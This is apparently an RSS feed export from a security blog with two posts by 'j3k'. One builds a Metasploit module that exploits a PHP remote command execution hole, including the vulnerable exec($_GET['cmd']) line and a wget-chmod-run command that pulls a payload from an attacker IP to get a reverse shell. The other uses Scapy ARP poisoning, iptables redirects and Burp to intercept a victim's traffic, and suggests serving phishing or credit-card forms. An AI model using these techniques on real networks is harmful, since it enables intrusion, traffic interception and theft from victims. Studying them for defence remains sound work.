@@ -1,0 +1,273 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>j3k &#8211; Team ROT Information Security</title>
+	<atom:link href="/author/j3k/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>Team ROT Information Security</description>
+	<lastBuildDate>Sat, 29 Aug 2020 10:51:01 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+
+<image>
+	<url>/wp-content/uploads/2020/08/cropped-ROT2-WHITE-BG.eps_-2-32x32.png</url>
+	<title>j3k &#8211; Team ROT Information Security</title>
+	<link>/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Exploit Development &#8211; Metasploit modules for fun &#038; profit</title>
+		<link>/how-to-metasploit-exploit-development/</link>
+					<comments>/how-to-metasploit-exploit-development/#respond</comments>
+		
+		<dc:creator><![CDATA[j3k]]></dc:creator>
+		<pubDate>Thu, 16 Feb 2017 21:18:21 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">http://blog.rot.fi/?p=247</guid>
+
+					<description><![CDATA[Lets go through an exploit module I built for Metasploit Framework.
+In a nutshell, the exploit contains only a couple of key elements - a HTTP Client and Server and a generated malicious payload.
+I needed an easy way to abuse a Remote Command Execution vulnerability. A full exploit module that would generate the selected payload and return a meterpreter reverse shell back to me. All in one go.]]></description>
+										<content:encoded><![CDATA[<p>Lets go through an exploit module I built for Metasploit Framework.<br />
+In a nutshell, the exploit contains only a couple of key elements &#8211; a HTTP Client and Server and a generated malicious payload.<br />
+I needed an easy way to abuse a <em>Remote Command Execution</em> vulnerability. A&nbsp;full exploit module that would generate the selected payload and return a meterpreter reverse shell back to me. All in one go.<br />
+Generally, exploit development is much more time consuming &#8211; and sometimes even more difficult &#8211; than just &#8220;triggering&#8221; the found vulnerability with a HTTP Request for instance.<br />
+What this exploit module does, is it exploits a <em>RCE</em> vulnerability via a malicious <em>HTTP GET</em> request.<br />
+Whats required from the victim, is that a linux &#8216;<em>wget&#8217;</em> tool is installed, which is very common. &nbsp; &nbsp;&#8230; and of course that there is a RCE vulnerability that allows the attacker to run shell commands.<br />
+Here is an example of PHP Code that would create such a vulnerability.</p>
+<pre><em>https://rot.fi/vulnerable_url.php:
+&nbsp;&lt;?php exec($_GET['cmd']); ?&gt;</em></pre>
+<p>You would simple call this URL by <em><strong>https://rot.fi/vulnerable_url.php?cmd=hostname</strong></em><br />
+and that would result the backend webserver to run this the supplied command &#8216;hostname&#8217;. You wouldn&#8217;t see the result on page, as it is not printed on it.<br />
+I&#8217;ll break down the module and try to explain each part of it.</p>
+<h1>Foundations()</h1>
+<p>In order to get this module working, we need to define that it&#8217;s a Metasploit <span style="text-decoration: underline;">Exploit</span> Module, and include the required libraries.<br />
+To define a module type, you define it in the <strong>class&nbsp;MetasploitModule&nbsp;&lt;&nbsp;Msf::Exploit.</strong><br />
+For an auxiliary module, you would use <strong>class MetasploitModule &lt; Msf::Auxiliary</strong></p>
+<blockquote>
+<div class="codebox">require&nbsp;&#8216;msf/core&#8217;<br />
+class&nbsp;MetasploitModule&nbsp;&lt;&nbsp;Msf::Exploit<br />
+include&nbsp;<span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #008000;">EXE</span><br />
+include&nbsp;<span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpClient</span><br />
+include&nbsp;<span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpServer</span>::<span style="color: #0000ff;">HTML</span></div>
+</blockquote>
+<h1><span style="color: #0000ff;"><span style="color: #333333;">OnesAndZeros()</span></span></h1>
+<p><span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #008000;">EXE</span>, is what you need to generate a binary payload.<br />
+This guy is essential to our specific need to respond to a <em>HTTP GET</em> request with a file that&#8217;s loaded with goodies.</p>
+<h1>TriggerVuln()</h1>
+<p><span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpClient</span>&nbsp;, is what we&#8217;ll be using to poke the target and have it request a file from us.<br />
+<span style="color: #008000;">HttpClient</span>&nbsp;will introduce you to four&nbsp;extra Opts &#8211; <strong>RHOST,</strong>&nbsp;<strong>RPORT,SSL and VHOST &#8211;</strong>&nbsp;which will be used to define which server and port we want use to send the HTTP requests to and <strong>VHOST</strong> for defining what kind of <em>HTTP Host</em>-header we want to use. The <strong>SSL</strong> Opt is a boolean defining whether or not the client connection is encrypted.<br />
+Above, I gave you an example of running a &#8216;<strong><em>hostname</em></strong>&#8216; command on the vulnerable server, which would likely be of no benefit to the attacker.<br />
+For this case, I would use a chained command that would firstly download my evil binary payload, give it execute permissions and then run it&#8230;<br />
+&#8230;like &#8216;<em><strong>wget 10.0.0.1/evil -O /tmp/evil;chmod 777 /tmp/evil;/tmp/evil</strong></em>&#8216;<br />
+In a HTTP Request, it would look something like this</p>
+<blockquote><p>https://rot.fi/vulnerable_url.php?<strong>cmd</strong>=<span style="color: #ff0000;"><em><strong>wget 10.0.0.1/evil -O /tmp/evil</strong></em></span><br />
+https://rot.fi/vulnerable_url.php?<strong>cmd=</strong><span style="color: #ff0000;"><em><strong>chmod 777 /tmp/evil<br />
+</strong></em></span><br />
+https://rot.fi/vulnerable_url.php?<strong>cmd</strong><strong>=</strong><span style="color: #ff0000;"><em><strong>/tmp/evil</strong></em></span></p></blockquote>
+<h1>HereToServe()</h1>
+<p><span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpServer</span>::<span style="color: #0000ff;">HTML<span style="color: #333333;">, is what we use to deliver requested the payload.</span></span><br />
+The <span style="color: #008000;">HttpServer</span>&nbsp;will introduce you to two extra Opts, <strong>SRVHOST</strong> and <strong>SRVPORT</strong> and it has two key functions you need to notice. The Opts will define which IP and port the HttpServer will bind to.</p>
+<h2><span style="color: #808000;">def</span> <strong>primer</strong></h2>
+<p>What is defined here runs when the <span style="color: #808000;">HttpServer</span> is started but still before any connections are accepted in.<br />
+We don&#8217;t need to do anything here, this time.</p>
+<h2><span style="color: #808000;">def</span> <strong>on_request_uri(cli, req)</strong></h2>
+<p>This function is called each time a request comes in.<br />
+What is noteworthy is that the <strong>on_request_uri</strong> is called when the exact <em>URI</em> is called, which we will be defining later in the module.<br />
+In this function I&#8217;m generating the binary payload on each request and sending it back to the client.<br />
+What the payload will contain, will be the one you choose while configuring the exploit.<br />
+<img decoding="async" class=" size-full wp-image-568 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/on_request.jpg" alt="on_request.JPG" width="460" height="117" srcset="/wp-content/uploads/2017/02/on_request.jpg 460w, /wp-content/uploads/2017/02/on_request-300x76.jpg 300w" sizes="(max-width: 460px) 100vw, 460px" /></p>
+<h1>Initialize()</h1>
+<p>For an exploit module, you need to define a target, and the <strong>register_options</strong> are used by the HTTP Server library.<br />
+In the initialize function you also define the Name, Author and License for your creation, among other things. For a BufferOverflow exploit, you&#8217;d define bad characters and usually multiple targets like kernel versions and such.<br />
+Also, notice that the <strong>register_options</strong> Opts are typecasted, to strings, integers, etc..<br />
+<img decoding="async" class=" size-full wp-image-543 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/initialize.jpg" alt="initialize" width="751" height="444" srcset="/wp-content/uploads/2017/02/initialize.jpg 751w, /wp-content/uploads/2017/02/initialize-300x177.jpg 300w, /wp-content/uploads/2017/02/initialize-705x417.jpg 705w" sizes="(max-width: 751px) 100vw, 751px" /></p>
+<h1>Code()</h1>
+<p>A Metasploit Exploit will be using a exploit and check functions.</p>
+<h2><strong><span style="color: #808000;">def</span> check</strong></h2>
+<p>This function is supposed to be used to check if the target is vulnerable. Sometimes its not even possible but its best to have even partial check than to launch an exploit script against a target that&#8217;s not even online.<br />
+<img decoding="async" class=" size-full wp-image-555 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/check.jpg" alt="check" width="472" height="248" srcset="/wp-content/uploads/2017/02/check.jpg 472w, /wp-content/uploads/2017/02/check-300x158.jpg 300w" sizes="(max-width: 472px) 100vw, 472px" /><br />
+The above check function sends a GET request at the <strong>RHOST </strong>and checks if the HTTP return code is OK or not.<br />
+Based on the HTTP code, we return a Vulnerable or a Safe status to the exploit module.</p>
+<h2><strong><span style="color: #808000;">def</span> exploit</strong></h2>
+<p>In most cases, this is where the magic happens.<br />
+You can rewrite <strong>Opts</strong> by manipulating the <strong>datastore[]</strong> array.<br />
+The <span style="color: #008000;">HTTPServer</span> is started as a new instance with the <strong><span style="color: #000000;">start_service()</span></strong> function.<br />
+By&nbsp;setting <strong>SSL</strong> <strong>Opt</strong> to <span style="color: #808000;">true</span>/<span style="color: #808000;">false</span>&nbsp;you can choose whether you want to start&nbsp;the <span style="color: #008000;">HTTPServer</span>&nbsp;with Transport Layer Security.<br />
+<img decoding="async" class=" size-full wp-image-556 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/exploit.jpg" alt="exploit" width="541" height="463" srcset="/wp-content/uploads/2017/02/exploit.jpg 541w, /wp-content/uploads/2017/02/exploit-300x257.jpg 300w" sizes="(max-width: 541px) 100vw, 541px" /><br />
+I&#8217;ve put in a <strong>sleep(150)&nbsp;</strong>because sometime it takes time for the victim to execute the payload, so we don&#8217;t want our script to die before that happens.<br />
+The actual exploitation takes place in the <strong>request</strong> function</p>
+<h2><strong><span style="color: #808000;">def</span> request</strong></h2>
+<p><img decoding="async" class=" size-full wp-image-557 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/request.jpg" alt="request" width="538" height="266" srcset="/wp-content/uploads/2017/02/request.jpg 538w, /wp-content/uploads/2017/02/request-300x148.jpg 300w" sizes="(max-width: 538px) 100vw, 538px" /></p>
+<h1>What now?</h1>
+<p>So whats really cool about a exploit module like this, is that you get it all &nbsp;in the Swiss army knife we call Metasploit Framework.<br />
+Instead of using this module, we could do the same manually:</p>
+<ol>
+<li>Setup and configure an Apache Web server</li>
+<li>Create a binary payload with <strong>msfvenom</strong> manually</li>
+<li>Setup a Listener / &nbsp;Handler to grab the shell</li>
+<li>Trigger the vulnerability with curl/wget</li>
+</ol>
+<p>Yes, I guess if you compare the time it takes to develop a working module to the time it takes to do the above four steps, the latter wins.<br />
+Let me demonstrate you how this is exploited via the working module.<br />
+Firstly, you need to download and add the module to Metasploit</p>
+<pre>git clone https://github.com/jake08/Metasploit
+mv Metasploit/rot_rce.rb /usr/share/metasploit-framework/modules/exploits/linux/http</pre>
+<p>Then start up msfconsole and find the module</p>
+<blockquote>
+<h6>msfconsole<br />
+search rot_rce</h6>
+<p><img decoding="async" class="alignnone size-full wp-image-612" src="http://165.232.69.132/wp-content/uploads/2017/02/msfsearch.jpg" alt="msfsearch" width="838" height="222" srcset="/wp-content/uploads/2017/02/msfsearch.jpg 838w, /wp-content/uploads/2017/02/msfsearch-300x79.jpg 300w, /wp-content/uploads/2017/02/msfsearch-768x203.jpg 768w, /wp-content/uploads/2017/02/msfsearch-705x187.jpg 705w" sizes="(max-width: 838px) 100vw, 838px" /></p></blockquote>
+<p>Then use and set it up according to your network<br />
+here&#8217;s a friendly &nbsp;reminder what&#8217;s what:</p>
+<ul>
+<li>RHOST =&gt; Target Host that has the RCE Vulnerability</li>
+<li>RPORT =&gt; Target Port for the above server</li>
+<li>SRVHOST =&gt; The IP for the Local HTTP Server, make sure its reachable by RHOST</li>
+<li>SRVPORT =&gt; Port for the above Server</li>
+<li>VHOST =&gt; Virtual Host, or HTTP Host-header for RHOST eg. amazon.com, rot.fi</li>
+<li>WRITABLEDIR =&gt; A Directory on the RHOST where we can drop the payload</li>
+<li>PAYLOAD =&gt; Your friendly neighborhood reverse shell</li>
+<li>LHOST =&gt; Return IP for the reverse shell, make sure its reachable by RHOST</li>
+<li>LPORT =&gt; Port for above server</li>
+</ul>
+<blockquote><p><img decoding="async" class="alignnone size-full wp-image-627" src="http://165.232.69.132/wp-content/uploads/2017/02/setupexploit1.jpg" alt="setupexploit" width="843" height="705" srcset="/wp-content/uploads/2017/02/setupexploit1.jpg 843w, /wp-content/uploads/2017/02/setupexploit1-300x251.jpg 300w, /wp-content/uploads/2017/02/setupexploit1-768x642.jpg 768w, /wp-content/uploads/2017/02/setupexploit1-705x590.jpg 705w" sizes="(max-width: 843px) 100vw, 843px" /></p></blockquote>
+<p>Run check and&nbsp;exploit for profit.<a href="https://github.com/jake08/Metasploit/blob/master/rot_rce.rb"><br />
+</a></p>
+<blockquote><p><img decoding="async" class="alignnone size-full wp-image-625" src="http://165.232.69.132/wp-content/uploads/2017/02/msfexploit.jpg" alt="msfexploit.JPG" width="646" height="474" srcset="/wp-content/uploads/2017/02/msfexploit.jpg 646w, /wp-content/uploads/2017/02/msfexploit-300x220.jpg 300w" sizes="(max-width: 646px) 100vw, 646px" /></p></blockquote>
+<h1></h1>
+<h2>Additional resources</h2>
+<p><a href="https://github.com/jake08/Metasploit/blob/master/rot_rce.rb">Complete module code</a><br />
+<a href="http://www.rubydoc.info/github/rapid7/metasploit-framework/">More on Metasploit Module development<br />
+</a></p>
+<p><strong>Logout</strong><br />
+j3k, hacker</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/how-to-metasploit-exploit-development/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Decomposing LAN security with Scapy and Burp Suite</title>
+		<link>/decomposing-lan-security-with-scapy-and-burp-suite/</link>
+					<comments>/decomposing-lan-security-with-scapy-and-burp-suite/#respond</comments>
+		
+		<dc:creator><![CDATA[j3k]]></dc:creator>
+		<pubDate>Tue, 07 Feb 2017 10:25:36 +0000</pubDate>
+				<category><![CDATA[Guide]]></category>
+		<guid isPermaLink="false">http://blog.rot.fi/?p=19</guid>
+
+					<description><![CDATA[How to intercept and proxy HTTP(S) requests from a mobile device without having to root the device.]]></description>
+										<content:encoded><![CDATA[<p><br />
+<a href="https://github.com/jake08/RotMiTM">Man-in-the-Middle with RotMiTM()</a><br />
+This is a demo of how to intercept and proxy HTTP and HTTPS requests from a mobile device without having to root the device (though it isn&#8217;t limited to mobile devices).<br />
+As an alternative to <a href="https://wifipineapple.com/">HAK5 WiFi Pineapple</a> this might be the cheaper option, but obviously doesn&#8217;t have all the fancy features that a pineapple has.<br />
+Check out <a href="https://github.com/jvesiluoma/WipeScanner">this</a>, a script on how to abuse a WiFi Pinapple by <b>Apox</b>.<br />
+In short, it&#8217;s about ARP Poisoning the LAN network to route all traffic from the victim to me and then intercept and modify the HTTP/HTTPS requests and responses.<br />
+By using python flask server, I wanted to demonstrate how simple it would be to have the victim run malicious code.<br />
+In total, the whole project was about 100 lines of code and most of the time spent on this project was on writing this blog post.<br />
+Of course there are warnings of self-signed certificates, but that only applies to HTTPS.<br />
+Tools used in this demo<br />
+Burp Suite (by Portswigger) to intercept HTTP/S Requests.<br />
+Python Scapy Framework to ARP Poison the network and &#8220;reroute&#8221; traffic<br />
+Python flask to setup an easy and fast web server.<br />
+Flask isn&#8217;t necessarily required to accomplish this, but its a nice and handy tool for capturing and storing data like stolen cookies etc, sky&#8217;s the limit.<br />
+e.g You could easily create a SQLite database and store each client, request, session cookie, parameter value and so forth<br />
+But now to the actual demo..</p>
+<h2>Quiz</h2>
+<div class="file-navigation js-zeroclipboard-container">
+<pre class="breadcrumb js-zeroclipboard-target"><span class="repo-root js-repo-root"><span class="js-path-segment"><a href="https://github.com/jake08/RotMiTM">RotMiTM</a></span></span><span class="separator">/</span><strong class="final-path">RotMiTM.py</strong>
+<span class="pl-k" style="color:#0000ff;">def</span> <span class="pl-en">startupQuiz</span>(<span class="pl-smi"><span class="pl-smi">self</span></span>):</pre>
+</div>
+<p><img decoding="async" class="alignnone size-full wp-image-92" src="http://165.232.69.132/wp-content/uploads/2017/02/quiz.png" alt="quiz" width="370" height="161" srcset="/wp-content/uploads/2017/02/quiz.png 370w, /wp-content/uploads/2017/02/quiz-300x131.png 300w" sizes="(max-width: 370px) 100vw, 370px" /><br />
+After firing up the script, you need to define which interface you&#8217;re going to use for poisoning, which is the victims IP address and the gateway IP, which usually is the nearest router or firewall.<br />
+The script will assume some of the targets, but better fill them in according to your use case.</p>
+<h2>Poison()</h2>
+<pre class="breadcrumb js-zeroclipboard-target"><span class="repo-root js-repo-root"><span class="js-path-segment"><a href="https://github.com/jake08/RotMiTM">RotMiTM</a></span></span><span class="separator">/</span><strong class="final-path">RotMiTM.py</strong>
+<span class="pl-k" style="color:#0000ff;">def</span> <span class="pl-en">poison</span>(<span class="pl-smi"><span class="pl-smi">self</span></span>, <span class="pl-smi">victimIP</span>, <span class="pl-smi">victimMAC</span>, <span class="pl-smi">gatewayIP</span>, <span class="pl-smi">gatewayMAC</span>):
+&nbsp; send(ARP(<span class="pl-v">op</span> <span class="pl-k">=</span> <span class="pl-c1">2</span>, <span class="pl-v" style="color:#ff9900;">pdst</span> <span class="pl-k">=</span> victimIP, <span class="pl-v" style="color:#ff9900;">psrc</span> <span class="pl-k">=</span> gatewayIP, <span class="pl-v" style="color:#ff9900;">hwdst</span> <span class="pl-k">=</span> victimMAC))</pre>
+<p>How ARP Poisoning works, is that you broadcast malicious ARP Packets to your Layer 2 Network .<br />
+Basically, a device broadcasts to the network a packet asking &#8220;Who has this IP address&#8221; and to that question, the device that really does have that IP address sort of broadcasts into the network saying &#8220;its me&#8221;.<br />
+What we do here is we also say &#8220;its me&#8221;, which will override the legit response meaning that now the device thinks that we&#8217;re actually the gateway.<br />
+In order to make this bi-directional, we also need to poison the way back to the client, and we do.</p>
+<h2>Rot()</h2>
+<pre><span class="pl-k" style="color:#0000ff;">def</span> <span class="pl-en">rot</span>(<span class="pl-smi"><span class="pl-smi">self</span></span>,<span class="pl-smi">victimIP</span>, <span class="pl-smi">gatewayIP</span>, <span class="pl-smi">interface</span>):
+&nbsp;&nbsp;&nbsp; <span style="color:#0000ff;">while</span> 1:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.poison(victimIP, victimMAC, gatewayIP, gatewayMAC)</pre>
+<p>In order to maintain the decomposing state of the network, we continue broadcasting the malicious ARP packets over and over again.<br />
+Below you can see it in action. Make note that both the &#8220;gateway&#8221; and the victim have the same MAC address (c4:85:08:8b:94:67) which actually is the MAC address of the attacker, which is us.<br />
+<img decoding="async" class=" size-full wp-image-166 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/arppoison.png" alt="arppoison" width="835" height="187" srcset="/wp-content/uploads/2017/02/arppoison.png 835w, /wp-content/uploads/2017/02/arppoison-300x67.png 300w, /wp-content/uploads/2017/02/arppoison-768x172.png 768w, /wp-content/uploads/2017/02/arppoison-705x158.png 705w" sizes="(max-width: 835px) 100vw, 835px" /></p>
+<h2>It&#8217;s alive!</h2>
+<p>So now, the Frankenstein has been awakened, and the network is ours.<br />
+By utilizing <span style="color:#008000;">tcpdump</span> we can inspect and verify that indeed, the traffic is going through us.<br />
+<img decoding="async" class=" size-full wp-image-27 aligncenter" src="https://rotfi.files.wordpress.com/2017/02/tcpdumprequest.png" alt="tcpdumprequest" width="944" height="480"><br />
+In the above example, we can see a HTTP GET request to <span style="color:#ff0000;">j3k.fi<span style="color:#000000;">. </span></span><br />
+So now that we&#8217;re the man in the middle, we want to intercept the request <span style="text-decoration:underline;">before</span> its going to where its supposed to.<br />
+For that we need to redirect traffic with <span style="color:#008000;">iptables</span> to our proxy of choice, which is<span style="color:#008000;"> Burp Suite </span>in this case.</p>
+<div class="file-navigation js-zeroclipboard-container">
+<pre><span class="repo-root js-repo-root"><span class="js-path-segment"><a href="https://github.com/jake08/RotMiTM">RotMiTM</a></span></span><span class="separator">/</span><strong class="final-path">rot_mitm.py</strong>
+&nbsp; http="iptables -t nat -A PREROUTING -i "+interface+" -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080"
+&nbsp; https="iptables -t nat -A PREROUTING -i "+interface+" -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080"
+&nbsp; os.system(http)
+&nbsp; os.system(https)</pre>
+</div>
+<h2>Setting up Burp</h2>
+<p>This tool is excellent as is and very expandable by so many public modules for pretty much anything that concerns testing web applications.<br />
+<img decoding="async" class="alignnone size-full wp-image-22" src="http://165.232.69.132/wp-content/uploads/2017/02/burpinvisibleproxy.png" alt="burpinvisibleproxy" width="792" height="281"><br />
+To get started, you need to configure Burp proxy to listen the port defined in the iptables redirect. Port TCP/8080.<br />
+Also, be sure to enable the invisible proxy setting, as it is vital for this to work.<br />
+Now, Burp Suite will be able to intercept the requests and we can start modifying them.<br />
+For this demo, we added a Hostname Resolution for j3k.fi to point to 127.0.0.1, where our malicious python flask web server is located.<br />
+<img decoding="async" class="alignnone size-full wp-image-21" src="http://165.232.69.132/wp-content/uploads/2017/02/burpdnsconfig.png" alt="burpdnsconfig" width="986" height="567"></p>
+<h2>Genie in a bottle</h2>
+<div class="file-navigation js-zeroclipboard-container">
+<pre class="breadcrumb js-zeroclipboard-target"><span class="repo-root js-repo-root"><span class="js-path-segment"><a href="https://github.com/jake08/RotMiTM">RotMiTM</a></span></span><span class="separator">/</span><strong class="final-path">flaskserver.py</strong>
+<span class="pl-k" style="color:#0000ff;">def</span> <span class="pl-en">CustomResponse</span>():</pre>
+</div>
+<p><img decoding="async" class="alignnone size-full wp-image-24" src="http://165.232.69.132/wp-content/uploads/2017/02/flaskserver.png" alt="flaskserver" width="691" height="196"><br />
+What I mean by Genie, is&nbsp; a hacker using Python Flask.<br />
+We are using a flask server to return HTTP Code 200 and some HTML code, more on this below..<br />
+With Python Flask, you can create an adhoc HTTP server to do basically whatever you want, as it is a Python framework, its just a matter of what you can or want do with it..</p>
+<h2>Back to Burp, capture and modify</h2>
+<p>On the mobile device, we browse to https://j3k.fi/ and what happens here is that our MiTM box, intercepts the request, replaces the real IP address of j3k.fi with what was defined in the Hostname Resolution setting in Burp Suite.<br />
+So now, the victim assumes that whatever response he gets, will be originating from real j3k.fi, when it really isn&#8217;t&#8230;</p>
+<p style="text-align:justify;"><img decoding="async" class=" size-full wp-image-23 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/dnsintercepted.png" alt="dnsintercepted" width="908" height="381"></p>
+<p><img decoding="async" class="alignnone size-full wp-image-25" src="http://165.232.69.132/wp-content/uploads/2017/02/httpsresponsexss.png" alt="httpsresponsexss" width="690" height="373"></p>
+<div class="breadcrumb js-zeroclipboard-target"></div>
+<p>Voilà, we&#8217;ve now successfully sent the victim a messagebox saying <em>&#8216;XSS&#8217;.</em><br />
+Hardly exciting huh?<br />
+Feel free to replace that HTML/JavaScript with some that is more targeted, like a phishing site or a network login form asking for Hotel Room number, credit card numbers etc..</p>
+<h2>Cure()</h2>
+<div class="file-navigation js-zeroclipboard-container">
+<pre class="breadcrumb js-zeroclipboard-target"><span class="repo-root js-repo-root"><span class="js-path-segment"><a href="https://github.com/jake08/RotMiTM">RotMiTM</a></span></span><span class="separator">/</span><strong class="final-path">RotMiTM.py</strong>
+<span class="pl-k" style="color:#0000ff;">def</span> <span class="pl-en">cure</span>(<span class="pl-smi"><span class="pl-smi">self</span></span>,<span class="pl-smi">victimIP</span>, <span class="pl-smi">victimMAC</span>, <span class="pl-smi">gatewayIP</span>, <span class="pl-smi">gatewayMAC</span>):</pre>
+</div>
+<div class="breadcrumb js-zeroclipboard-target">As all <del><span style="text-decoration:underline;">good things</span></del> bad deeds must come to an end, we cure the poisoned network and return MAC tables to what they are supposed to be.</div>
+<div class="breadcrumb js-zeroclipboard-target">This will help us leave the network peacefully and without being noticed.</div>
+<div class="breadcrumb js-zeroclipboard-target"></div>
+<div class="breadcrumb js-zeroclipboard-target"></div>
+<p><strong>Logout</strong><br />
+J3k, hacker.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/decomposing-lan-security-with-scapy-and-burp-suite/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
